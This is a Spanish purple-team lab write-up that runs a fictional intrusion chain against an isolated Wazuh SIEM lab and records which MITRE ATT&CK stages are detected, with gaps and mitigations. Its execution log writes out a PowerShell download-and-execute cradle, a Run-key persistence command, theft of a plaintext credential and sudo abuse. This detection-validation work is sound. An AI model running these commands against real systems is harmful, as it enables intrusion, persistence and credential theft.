# Escenario de Ataque — Cadena de Intrusión AustralPay
**AustralPay es una organización ficticia creada exclusivamente con fines de laboratorio y portafolio. Ninguna infraestructura, dato o incidente descrito corresponde a una empresa real.**

Proyecto: Wazuh SIEM · AustralPay Lab
Documento: definición del escenario de ataque para validación de detección (ejercicio purple team)
Bloque: 5 (Cadena de ataque + timeline + informes + Navigator)

---

## 1. Propósito

Este documento define una **cadena de intrusión completa** contra la infraestructura ficticia de AustralPay, diseñada como ejercicio de **purple team**: se ejecuta una secuencia de tácticas adversarias realistas contra el laboratorio para **medir la cobertura de detección** del SIEM ya construido en los Bloques 3 y 4.

El objetivo no es comprometer nada — es responder con evidencia dos preguntas de operación de seguridad:

1. ¿Qué eslabones de una intrusión real **detecta** el stack actual, y con qué severidad?
2. ¿Qué eslabones **pasan por debajo** de la detección, y qué mitigación correspondería?

El resultado alimenta directamente los entregables del Bloque 5: el **timeline de investigación**, los **informes de incidente estilo N1** y la **capa de MITRE ATT&CK Navigator**.

> Nota metodológica central: en todas las etapas se genera **telemetría**, no daño. Contenido benigno, credenciales de prueba, sin exfiltración real y sin herramientas de robo de credenciales funcionales. Lo que se valida es si el SIEM **ve el comportamiento**, no la capacidad ofensiva. Esta es la metodología estándar de validación de detección: reproducir la *señal* que una técnica genera, con métodos seguros, en un entorno aislado.

---

## 2. Modelo de amenaza

### Perfil del adversario
Una fintech / procesador de pagos es blanco de adversarios con **motivación financiera** (grupos de e-crime, familias de amenaza tipo FIN). El adversario no busca "hackear por hackear": busca datos de tarjetas, información personal (PII) o mover dinero. Esto define el **objetivo final** de la cadena: el atacante no entra para ejecutar un script y quedarse en la estación de un empleado; entra para llegar a `austral-app` / `austral-db`, donde vive lo que le interesa. Toda la cadena es el camino desde donde el atacante *puede* entrar hasta donde *quiere* llegar.

### Vector de entrada
El vector realista para una fintech es el **factor humano**: phishing con robo de credenciales o adjunto malicioso que aterriza en la estación de un empleado de operaciones — no el servidor Linux expuesto, que está más endurecido y monitoreado. La persona es la puerta.

### Escenario asumido: peor caso de higiene de seguridad
Este escenario modela deliberadamente el **peor caso humano** para una organización que maneja medios de pago: personal de operaciones **sin capacitación de concientización en seguridad**. Esa suposición justifica, de forma coherente, cada eslabón de la cadena:

- El operador **abre el phishing sin dudar** y habilita la ejecución del contenido (etapa 1).
- El operador tiene **credenciales del servidor de pagos guardadas o cacheadas** en su estación (habilita etapa 4).
- Se **reutilizan credenciales** entre la estación y el servidor (habilita el movimiento lateral, etapa 6).

Modelar el peor caso es intencional: expone la superficie de ataque máxima y hace visible cuánto de la defensa depende de controles técnicos cuando el control humano falla — que es precisamente el argumento de por qué una fintech necesita un SOC.

### Objetivo final
Acceso a la base de datos de transacciones y/o data de tarjetas alojada en el núcleo (`austral-app` / `austral-db`). Todo lo demás es el medio para llegar ahí.

---

## 3. Entorno y alcance

| Host | IP | Rol en el escenario | SO / Telemetría |
|---|---|---|---|
| `austral-siem` | 192.168.1.50 | Wazuh manager (observador) | Docker, Wazuh 4.9.2 |
| `austral-ws01` | 192.168.1.65 | **Punto de entrada** — estación de operaciones comprometida | Windows 10 Pro 22H2 + Sysmon (SwiftOnSecurity) |
| `austral-app` | 192.168.1.55 | **Objetivo** — servidor de aplicación de pagos | Ubuntu + agente Wazuh |
| `austral-db` | 192.168.1.60 | Objetivo secundario / máquina atacante | Ubuntu + agente Wazuh |
| Kali | 192.168.1.100 | Máquina atacante (origen externo alternativo) | Herramientas ofensivas de lab |

### Restricciones de seguridad del ejercicio
- Laboratorio **100% aislado**, sin conexión a infraestructura real.
- Todo el contenido ejecutado es **benigno**: cadenas de descarga inofensivas, wordlists de prueba, credenciales de laboratorio.
- **No** se ejecutan dumpers de credenciales funcionales; la telemetría de acceso a credenciales se genera con medios estándar y seguros (ver etapa 4).
- **No** hay exfiltración real de datos.
- Las **transiciones entre hosts** (pivotes) se ejecutan de verdad donde es viable y se **declaran explícitamente** como transición narrativa donde no lo son.

### 3.1 Artefactos sembrados (humo con propósito)

Para dar profundidad al entorno y objetivos concretos a la cadena, se siembran los siguientes artefactos ficticios **antes** de ejecutar el escenario. Todo es sintético y está rotulado como laboratorio; nada representa data real.

| # | Host | Artefacto | Ruta | Alimenta | Bajo FIM |
|---|---|---|---|---|---|
| 1 | `austral-app` | Almacén de transacciones (data de pago sintética) | `/opt/austral-app/data/transacciones.csv` | Etapa 7 (objetivo) | Sí |
| 2 | `austral-ws01` | Credencial de servidor en texto plano | `C:\Users\<operador>\Documents\accesos-servidores.txt` | Etapa 4 (robo) → 6B (reúso) | No¹ |

> ¹ El txt **no** se pone bajo FIM a propósito: el ataque de la etapa 4 es una *lectura*, y FIM detecta creación/modificación/borrado, no lectura. Monitorearlo sería teatro — no atraparía el robo. Su invisibilidad es justamente el gap documentado en §7.
| 3 | `austral-app` | Cuenta de operador plausible | usuario `soporte-pagos` | Etapa 6 (objetivo de login) | — |
| 4 | `austral-app` | Regla sudoers laxa (mala práctica del peor caso) | `soporte-pagos ALL=(ALL) ALL` en `/etc/sudoers.d/` | Etapa 7 (PrivEsc) | — |

**Coherencia de la cadena.** El archivo (2) contiene la credencial de la cuenta (3). El atacante la cosecha en la etapa 4 y la reutiliza para el acceso directo de la variante 6B. Así, el "robo de credencial" y el "acceso con credencial válida" son el **mismo hilo**, no dos hechos sueltos. El objetivo del brute force de la variante 6A es esa misma cuenta `soporte-pagos`, no `root` — un objetivo más realista que mantiene la credencial `root` deliberada intacta.

**Data sintética de pago.** El almacén (1) usa números de tarjeta de **prueba estándar** (ej. `4111 1111 1111 1111`), nombres y montos inventados, y el archivo se rotula explícitamente como data de laboratorio en su encabezado. Nunca se usa nada que se parezca a data real. Con esto el framing PCI-DSS del Bloque 4 se vuelve tangible: existe un objetivo concreto que un atacante querría y que el cumplimiento obliga a proteger — el "para qué" de toda la cadena deja de ser abstracto.

**Humo decorativo (sin rol de detección).** Se crean además 3–4 carpetas genéricas **vacías** para dar textura de entorno usado: en `austral-ws01`, `Documents\Respaldos` y `Documents\Proyectos-2024`; en `austral-app`, `/opt/austral-app/backups` y `/srv/legacy`. No tienen rol en la detección ni en la cadena — son ambientación. Se documentan aquí por dos razones: para que el entorno sea reproducible, y para dejar explícito, con honestidad, qué es funcional y qué es solo textura.

---

## 4. Vista de la cadena completa

La cadena recorre **ocho tácticas** de MITRE ATT&CK en orden aproximado de progresión (siete en el diseño original + Privilege Escalation, incorporada en ejecución — ver §9.1). Las etapas 1–3 constituyen el **primer acto** (asegurar el punto de apoyo — que corresponde al mínimo del Bloque 5: acceso inicial → ejecución → persistencia). Las etapas 4–7 son el **segundo acto** (avanzar hacia el objetivo), incluidas para reconstruir una intrusión completa y no una secuencia de detecciones sueltas.

| # | Táctica | Técnica | Host | Detección observada |
|---|---|---|---|---|
| **Acto 1 — El punto de apoyo** |||||
| 1 | Initial Access | T1566 (vector) → T1059.005 (script host) | `austral-ws01` | 92000 nivel 4 (contexto) |
| 2 | Execution | T1059.001 — PowerShell | `austral-ws01` | **Regla 100210** (nivel 12) ✅ |
| 3 | Persistence | T1547.001 — Run key | `austral-ws01` | Gap de regla (Sysmon EID 13 sí, Wazuh no) ⚠️ |
| **Acto 2 — El objetivo** |||||
| 4 | Credential Access | T1552.001 — Credentials In Files | `austral-ws01` | Gap: punto ciego total ⚠️ |
| 5 | Discovery | T1046 / T1018 | `austral-ws01` | Gap inherente ⚠️ |
| 6 | Lateral Movement | T1110.001 (A) / T1078 (B) | `ws01` → `austral-app` | **A: 100220 nivel 12 ✅ / B: blind spot ⚠️** (§6) |
| 7 | Privilege Escalation | T1548 — sudo | `austral-app` | **5402 ✅** |
| 7 | Impact | T1565 — Data Manipulation | `austral-app` | **550 nivel 7 (FIM whodata) ✅** |

---

## 5. Detalle por etapa

Cada etapa documenta: la táctica y técnica MITRE, el host, la narrativa dentro del relato AustralPay, el procedimiento de generación de telemetría, y la detección esperada. Los valores observados en ejecución (rule.id, rule.level, evento Sysmon) se registran en el **log de ejecución** (§9) a medida que se completa cada etapa.

### Etapa 1 — Initial Access
**Táctica:** Initial Access · **Técnica:** T1566 (Phishing, como vector) → detectada aguas abajo vía T1059.001
**Host:** `austral-ws01`

**Narrativa:** el operador de operaciones recibe un correo de phishing con un adjunto o enlace. Sin capacitación de seguridad (peor caso), lo abre y habilita la ejecución del contenido, que lanza un intérprete de comandos.

**Procedimiento (telemetría):** el phishing en sí no deja evento en el SIEM (ocurre en el correo, fuera del endpoint). Lo que sí queda es la **cadena de proceso padre-hijo anómala** en el momento en que el documento/navegador engendra `powershell.exe`. Se genera reproduciendo esa relación padre-hijo en la estación. La ejecución concreta del payload se cubre en la etapa 2; el acceso inicial es el **contexto de entrega** y la relación de proceso sospechosa.

**Detección esperada:** Sysmon Event ID 1 (Process Create) con relación padre-hijo anómala (proceso ofimático/navegador → `powershell.exe`). El vector de phishing como tal **no** se detecta desde el SIEM del endpoint — se documenta como límite conocido: la detección de phishing corresponde a la capa de correo (fuera del alcance de este proyecto; es el dominio del Proyecto 3).

### Etapa 2 — Execution
**Táctica:** Execution · **Técnica:** T1059.001 — Command and Scripting Interpreter: PowerShell
**Host:** `austral-ws01`

**Narrativa:** el contenido entregado es un *download-cradle* de PowerShell — descarga y ejecuta código en memoria, sin tocar disco, para evadir controles basados en archivo.

**Procedimiento (telemetría):** ejecución en el endpoint de un comando PowerShell con forma de download-cradle (combinación de intérprete en memoria `IEX`/`Invoke-Expression` con una primitiva de descarga remota) y **contenido benigno**. Es el mismo procedimiento con que se validó la regla 100210 en el Bloque 3B.

**Detección esperada:** **Regla 100210** (nivel 12, T1059.001). ✅ Ya validada en pipeline real. Cierra la táctica Execution con detección propia y severidad alta.

### Etapa 3 — Persistence
**Táctica:** Persistence · **Técnica:** T1547.001 (Registry Run Key) o T1053.005 (Scheduled Task)
**Host:** `austral-ws01`

**Narrativa:** el atacante se asegura de sobrevivir a un reinicio de la estación instalando un mecanismo de persistencia que relanza su acceso.

**Procedimiento (telemetría):** crear una entrada en una clave `...\Run` del registro apuntando a un binario/script benigno, **o** registrar una tarea programada benigna. Genera Sysmon Event ID 12/13 (creación/modificación de valor de registro) o Event ID 1 (`schtasks.exe` / creación de tarea).

**Detección esperada:** captada por el ruleset base de Wazuh (regla base sobre Sysmon), **nivel a verificar**. Es terreno nuevo respecto de los Bloques 3–4: no hay regla custom previa para persistencia. Decisión de diseño pendiente tras observar el nivel base — promover a alerta con una regla acotada, o documentar como **gap conocido**. El Bloque 5 no contempla escribir reglas custom (eso fue 3B/3C); la decisión por defecto es documentar la cobertura observada, no inflar el scope.

### Etapa 4 — Credential Access
**Táctica:** Credential Access · **Técnica:** T1552.001 (Unsecured Credentials: Credentials In Files) — vector primario · T1003 (OS Credential Dumping) — vector alternativo
**Host:** `austral-ws01`

**Narrativa:** el atacante cosecha credenciales desde la estación comprometida para conseguir la llave al servidor de pagos. En el peor caso asumido, el operador dejó la credencial del servidor guardada en un archivo de **texto plano** (`accesos-servidores.txt`, artefacto sembrado #2) — el clásico de la higiene deficiente.

**Procedimiento (telemetría) — metodología explícita:** **no** se ejecuta un dumper de credenciales funcional. Un dumper real sería bloqueado por las defensas del endpoint y, más importante, es innecesario: el objetivo es validar la **detección**, no obtener credenciales. Dos vectores:

- **Primario (T1552.001):** leer `accesos-servidores.txt` para obtener la credencial de `soporte-pagos` que se reutiliza en la variante 6B. Es lo que amarra el hilo robo→reúso de la cadena.
- **Alternativo (T1003):** generar la **señal** de un acceso a la memoria de `lsass.exe` — que dispara Sysmon Event ID 10 (ProcessAccess con target LSASS) — con medios estándar y seguros, para probar específicamente esa ruta de detección.

**Detección esperada:** el vector primario es un **gap** — la lectura de un archivo no genera evento FIM (FIM detecta creación/modificación/borrado, no lectura) ni telemetría clara; el robo de la credencial en texto plano es esencialmente invisible al stack actual, lo que refuerza por qué el peor caso humano es tan peligroso. El vector alternativo sí produce telemetría (Sysmon EID 10), aunque probablemente sin regla acotada en el ruleset base. Ambos se documentan como gaps con su mitigación (§7).

### Etapa 5 — Discovery
**Táctica:** Discovery · **Técnica:** T1046 (Network Service Discovery) / T1018 (Remote System Discovery)
**Host:** `austral-ws01`

**Narrativa:** con el punto de apoyo asegurado, el atacante mapea la red interna para ubicar los objetivos de alto valor (`austral-app`, `austral-db`).

**Procedimiento (telemetría):** reconocimiento interno benigno desde `austral-ws01` — barrido de la red y consulta de puertos/servicios con herramientas nativas o estándar, generando telemetría de proceso y de conexión.

**Detección esperada:** **baja o nula.** El reconocimiento interno con herramientas nativas es inherentemente difícil de detectar sin baselining de comportamiento o detección por volumen de conexiones (alta tasa de falsos positivos). Se documenta como **gap inherente** con su recomendación de mitigación (§7). Reconocerlo como difícil de detectar es parte del criterio de analista, no una falla del diseño.

### Etapa 6 — Lateral Movement (experimento A+B)
**Táctica:** Lateral Movement · **Técnica:** T1110.001 (variante A) / T1078 (variante B)
**Host:** `austral-ws01` → `austral-app`

Esta es la pieza central del ejercicio y se ejecuta en **dos variantes contrastadas**. Detalle completo en §6.

### Etapa 7 — Privilege Escalation + Impact
**Táctica:** Privilege Escalation → Impact · **Técnica:** T1548 (Abuse Elevation Control Mechanism: sudo) + T1078 (Valid Accounts) · T1565 (Data Manipulation) · T1005 (Data from Local System — lectura/exfil)
**Host:** `austral-app`

**Narrativa:** con acceso al servidor de pagos, el atacante va por el objetivo real — los datos de transacciones. Intenta modificar `transacciones.csv` con la cuenta `soporte-pagos` y **topa un techo de permisos** (`Permission denied`: el archivo es `root:root`, permisos bien puestos). Escala vía una configuración `sudo` demasiado laxa (`soporte-pagos ALL=(ALL) ALL`, artefacto sembrado #4 — la mala práctica del peor caso), usando la **misma credencial robada del txt** (`••••••••`), y modifica el dato como root.

**Procedimiento (real ejecutado):**
- Lectura del CSV (`cat`) → exfiltración simulada. **Silenciosa** (leer no dispara FIM).
- `echo ... >> transacciones.csv` como `soporte-pagos` → `Permission denied` (confirma el techo de privilegios).
- `echo ... | sudo tee -a transacciones.csv` con password `••••••••` → escritura exitosa como root (PrivEsc + Impact).

**Detección observada ✅ (doble):**
- **PrivEsc — `rule.id 5402`, nivel 3**, *"Successful sudo to ROOT executed"* (`data.srcuser: soporte-pagos`). El cruce del control auditado deja rastro en `auth.log`.
- **Impact — `rule.id 550`, nivel 7**, *"Integrity checksum changed"* sobre el CSV, vía FIM whodata del Bloque 4. El campo `syscheck.audit` reconstruyó la cadena completa de atribución: `login_user.name = soporte-pagos` (uid 1001) → `effective_user.name = root` (uid 0) → `process.name = /usr/bin/tee` con `process.parent_name = /usr/bin/sudo`. Es decir, el evento de Impact contiene por sí solo la prueba forense del PrivEsc: quién, con qué privilegios, y cómo escaló.

**Giro de detección:** todo el segundo acto (etapas 4, 5, 6B) fue invisible porque el atacante solo **abusó de confianza**. La etapa 7 es donde tuvo que **cruzar controles reales** (sudo + modificar un archivo bajo FIM) — y ahí, y solo ahí, el SIEM lo vio, con atribución completa. Los controles que se auditan son los que dan detección. La lectura del CSV (exfil pura) sigue siendo un gap, porque leer no es un evento monitoreado.

---

## 6. El experimento A+B en movimiento lateral

El movimiento lateral hacia el servidor de pagos se ejecuta de **dos formas distintas** para contrastar, con evidencia, la diferencia entre un ataque que el SIEM caza y uno que se le escapa. Esta es la demostración de criterio más fuerte del proyecto.

### Variante A — Fuerza bruta desde la estación comprometida
El atacante fuerza el acceso SSH a `austral-app` **desde** `austral-ws01`, generando fallos de autenticación seguidos de un acceso exitoso.

**Resultado observado ✅:** la **regla 100220 disparó** (nivel 12, T1110.001 + T1078) — *"SSH: login exitoso precedido de multiples fallos desde la misma IP"*. Precedida de los `5760` (fallos), `2502` nivel 10 y `5762` (composite syslog). La regla correlacionó el patrón fallo→éxito de una misma IP dentro de la ventana de 120s, sin depender de si esa IP está en la whitelist. Cadena **detectada**.

### Variante B — Credencial robada, acceso directo
El atacante usa la credencial de `soporte-pagos` **cosechada del `accesos-servidores.txt` en la etapa 4** y entra por SSH directamente, sin fuerza bruta previa.

**Resultado observado ❌:** **ninguna regla custom disparó.** El único evento fue un `5715` *"sshd: authentication success"* desde `192.168.1.65`, **nivel 3** — un login de rutina, más `5501`/`5502` (sesión PAM). Dos razones combinadas:

- La regla **100230** ("cuenta válida desde IP no confiable") **no** disparó porque el origen es `austral-ws01` (192.168.1.65) — un host interno, monitoreado y presente en la whitelist del Bloque 4. Para la regla, ese origen es **confiable**.
- La regla **100220** (brute force exitoso) **no** disparó porque el atacante usó una credencial que ya poseía: **no hubo fallos** que correlacionar.

**Resultado:** el movimiento lateral malicioso quedó registrado como un **login de trabajo normal (nivel 3)** — indistinguible de la actividad legítima. No es que no se registre; es que no genera ninguna señal de alarma. Este es el patrón *living-off-the-land* y es de lo más difícil de cazar en un SOC real.

### Valor del contraste
Ejecutar ambas variantes produce, lado a lado en el timeline, la evidencia de "así se ve cuando lo cazamos" (A) frente a "así se ve cuando se nos escapa" (B). El blind spot de la variante B **no es un fracaso del laboratorio** — es un hallazgo de cobertura de detección, documentado con su mitigación, que demuestra por qué una detección madura no puede apoyarse únicamente en la IP de origen.

---

## 7. Gaps de detección identificados y mitigaciones

Insumo directo para los informes de incidente del Bloque 5B: cada gap se documenta con la recomendación de remediación que un analista incluiría.

| Gap | Etapa | Por qué evade | Mitigación recomendada |
|---|---|---|---|
| **Movimiento lateral con credencial válida desde host confiable** | 6B | Origen interno/whitelisted + sin fallos que correlacionar | Allowlisting de jump-hosts; baselining de comportamiento de acceso (no confiar solo en IP de origen); detección de *impossible travel*; MFA en SSH interno; EDR con detección de uso anómalo de credenciales |
| **Credencial en archivo de texto plano** | 4 | La lectura de un archivo no genera evento FIM ni telemetría clara; el robo es esencialmente invisible | Prohibir almacenamiento de credenciales en texto plano (política + concientización); gestor de credenciales corporativo; escaneo de secretos en disco; FIM sobre archivos sensibles (detecta creación/modificación, no lectura) |
| **Acceso a credenciales (LSASS)** | 4 | No hay regla acotada sobre Sysmon EID 10 | Regla custom sobre Event ID 10 con target LSASS y allowlist de procesos legítimos; Credential Guard; deshabilitar cacheo de credenciales sensibles en estaciones |
| **Reconocimiento interno** | 5 | Herramientas nativas, difícil de distinguir de actividad legítima | Segmentación de red que limite el alcance de la estación; detección por volumen de conexiones (con tuning cuidadoso de FP); canaries/honeypots internos que alerten ante cualquier interacción |
| **Persistencia con nivel base** | 3 | Ruleset base puede asignar nivel bajo | Promover Sysmon EID 12/13 sobre claves `Run` / creación de tareas a nivel de alerta, con allowlist de entradas legítimas |
| **Acceso a datos / exfiltración** | 7 | Detección de acceso a datos limitada al cruce con FIM | Monitoreo de acceso a la base de datos a nivel de aplicación/DB; DLP; FIM extendido sobre los almacenes de datos sensibles |

---

## 8. Matriz de cobertura de detección

Resumen de qué detecta el stack actual sobre la cadena completa.

| Etapa | Táctica | ¿Detectado? | Mecanismo | Severidad |
|---|---|---|---|---|
| 1 | Initial Access | Parcial | Sysmon EID 1 → regla 92000 | Nivel 4 (contexto) |
| 2 | Execution | **Sí** ✅ | Regla 100210 | Nivel 12 (alto) |
| 3 | Persistence | **No** ❌ | Sysmon EID 13 generado, sin regla Wazuh que lo promueva | Gap **de regla** (el sensor sí ve) |
| 4 | Credential Access | **No** ❌ | Lectura de archivo no monitoreada | Gap (punto ciego total) |
| 5 | Discovery | **No** ❌ | — | Gap inherente |
| 6A | Lateral (brute force) | **Sí** ✅ | Regla 100220 | Nivel 12 (alto) |
| 6B | Lateral (cred robada) | **No** ❌ | Solo `5715` login de rutina | Gap (blind spot) |
| 7 | Privilege Escalation | **Sí** ✅ | Regla base 5402 (sudo→root) | Nivel 3 |
| 7 | Impact | **Sí** ✅ | FIM whodata (regla 550) con atribución | Nivel 7 |

**Lectura:** de nueve puntos de detección sobre la cadena, el stack cubre con severidad relevante **cuatro** (etapa 2, 6A, y las dos de la etapa 7), aporta contexto en 1, y presenta **cuatro gaps** claros (3, 4, 5, 6B). Hallazgo clave del patrón: el segundo acto es invisible mientras el atacante abusa de confianza (cred access, discovery, lateral robado), y solo se vuelve detectable cuando cruza controles auditados (sudo, FIM). El gap de persistencia se localizó específicamente en la **capa de regla** — Sysmon genera el EID 13, pero ninguna regla lo promueve — no en el sensor. Esta cobertura incompleta es el estado normal de un SOC en construcción y es, en sí misma, el hallazgo de valor: define la hoja de ruta de mejora de detección.

---

## 9. Log de ejecución (se completa por etapa)

Se registran aquí, a medida que se ejecuta cada etapa, los valores reales observados. Esto convierte el escenario de diseño en evidencia y es la materia prima del timeline (5B).

| Etapa | Fecha/hora (UTC) | Comando/acción ejecutada | Evento Sysmon / log | rule.id | rule.level | Evidencia (captura) |
|---|---|---|---|---|---|---|
| 1 | 2026-08-04 04:26 | `wscript.exe Factura-Pendiente-AustralPay.js` lanza `powershell.exe` (contenido benigno) | Sysmon EID 1 | 92000 (+ 92201) | 4 (92201 = 9) | evidence/E01-phishing-linaje.png |
| 2 | 2026-08-04 04:34 | `powershell.exe -Command "IEX (New-Object Net.WebClient).DownloadString('http://example.com/')"` desde powershell launcher | Sysmon EID 1 (base 92027) | **100210** | **12** | evidence/E02-cradle-100210.png |
| 3 | 2026-08-04 04:50 | `New-ItemProperty ...\CurrentVersion\Run\AustralUpdater` (Run key HKCU, sin admin) | Sysmon EID 13 (`RuleName: T1060,RunKey`) — generado, no alertado | — (sin regla) | — (gap de regla) | evidence/E03-persistencia-runkey.png |
| 4 | 2026-08-04 05:29 | `Get-Content accesos-servidores.txt` (robo de credencial `soporte-pagos`) | ninguno (lectura no monitoreada) | — | — (ciego total) | evidence/E04-robo-credencial.png · evidence/E05-robo-sin-deteccion.png |
| 5 | 2026-08-04 05:40 | `Test-NetConnection 192.168.1.55 -Port 22` (`TcpTestSucceeded: True`) + barrido del segmento | ninguno relevante | — | — (gap inherente) | evidence/E06-reconocimiento-ssh.png |
| 6B | 2026-08-04 06:27 | `ssh soporte-pagos@192.168.1.55` con credencial robada, sin fallos | `5715` auth success desde .65 (+ 5501/5502 PAM) | 5715 | 3 (sin alerta custom) | evidence/E07-lateral-credencial-valida.png |
| 6A | 2026-08-04 06:33 | `ssh` con 3 fallos (`Malo123`) + éxito, dentro de 120s | `5760` fallos + `2502`/`5762` + `5715` éxito | **100220** | **12** | evidence/E09-bruteforce-100220.png |
| 7 | 2026-08-04 06:57 / 07:01 | `sudo tee -a transacciones.csv` con `••••••••` (PrivEsc + Impact) tras `Permission denied` previo | `auth.log` (sudo) + syscheck FIM whodata | **5402** (PrivEsc) / **550** (FIM) | 3 / 7 | evidence/E11-escalada-sudo-5402.png · evidence/E12-impacto-fim-550.png |

---

## 9.1 Hallazgos operativos durante la ejecución

Eventos no planificados que surgieron al ejecutar la cadena. Se documentan porque son material de informe (5B) y de aprendizaje.

- **Falso positivo de alta severidad identificado y neutralizado.** Durante la etapa 1 se observó una ráfaga de la regla base **92213** (*"Executable file dropped in folder commonly used by malware"*, **nivel 15**) disparando repetidamente. Diagnóstico: `cleanmgr.exe` (Liberador de espacio de Windows) soltando `WimProvider.dll` en su carpeta temporal — comportamiento legítimo. Caso de manual de **fatiga de alertas** (un crítico falso, 26 veces). Se creó la regla de tuning **100212** (nivel 0), anclada a `image=cleanmgr.exe` **y** `targetFilename=WimProvider.dll`, tan específica como el FP para no abrir hueco al side-loading vía binarios legítimos. *(Nota de scope: la autoría de reglas es propia del Bloque 3B; se hizo aquí como decisión consciente de calidad de datos, no como parte del diseño del escenario.)*

- **Incidente operativo: corrupción del ruleset por `sed` sobre patrón repetido.** La 100212 se intentó insertar con `sed 's#</group>#...#'`, pero `local_rules.xml` contiene un `</group>` por regla (un patrón que se repite), por lo que `sed` insertó el bloque en cada cierre y dentro de líneas `<group>...`, corrompiendo el XML. Se detectó **antes de reiniciar** gracias a un `grep` de verificación. Reparado sobrescribiendo el archivo completo y validando el parseo con `wazuh-logtest` antes de recargar. **Lección:** nunca usar `sed` sobre patrones que aparecen N veces; para XML multi-bloque, reescribir el archivo completo y validar el parser antes de reiniciar el servicio.

- **Desviación de diseño: incorporación de Privilege Escalation (T1548).** El diseño original planteaba la etapa 7 como Collection/Impact directo. En ejecución, `soporte-pagos` no pudo escribir `transacciones.csv` (`root:root`, permisos correctos) — un techo de privilegios realista. Se decidió, conscientemente, **sumar Privilege Escalation como octava táctica**, sembrando una regla sudoers laxa (artefacto #4) coherente con el modelo de peor caso. Resultado: la cadena pasó de 7 a 8 tácticas y ganó su mejor evidencia forense (el FIM whodata reconstruyó `soporte-pagos → sudo → tee → root` en un solo evento). Enriquece la capa de Navigator del 5C.



- **El escenario excede el mínimo del bloque a propósito.** El Bloque 5 pide tres eslabones (acceso inicial → ejecución → persistencia); esta cadena tiene siete tácticas. La extensión demuestra reconstrucción de una intrusión completa en lugar de detecciones sueltas, que es el diferenciador de portafolio buscado. No es relleno: cada etapa aporta un punto de detección o un gap documentado.
- **Telemetría, no daño.** Todo el contenido ejecutado es benigno; no hay dumpers funcionales, credenciales reales ni exfiltración. El ejercicio valida detección, no capacidad ofensiva.
- **Pivotes explícitos.** Las transiciones entre hosts se ejecutan de verdad donde es viable y se declaran como transición narrativa donde no lo son. Ninguna transición se presenta como ejecutada si no lo fue.
- **Peor caso humano modelado deliberadamente.** La suposición de personal sin capacitación de seguridad es una elección de modelado para exponer la superficie de ataque máxima, no una afirmación sobre ninguna organización real.
- **Gaps documentados, no ocultados.** La cobertura de detección incompleta se reporta con transparencia y con su mitigación correspondiente. Un gap identificado con criterio vale más, en un contexto de análisis, que una regla de relleno que lo tape.

---
*AustralPay es una organización ficticia creada exclusivamente con fines de laboratorio y portafolio. Ninguna infraestructura, dato o incidente descrito corresponde a una empresa real.*
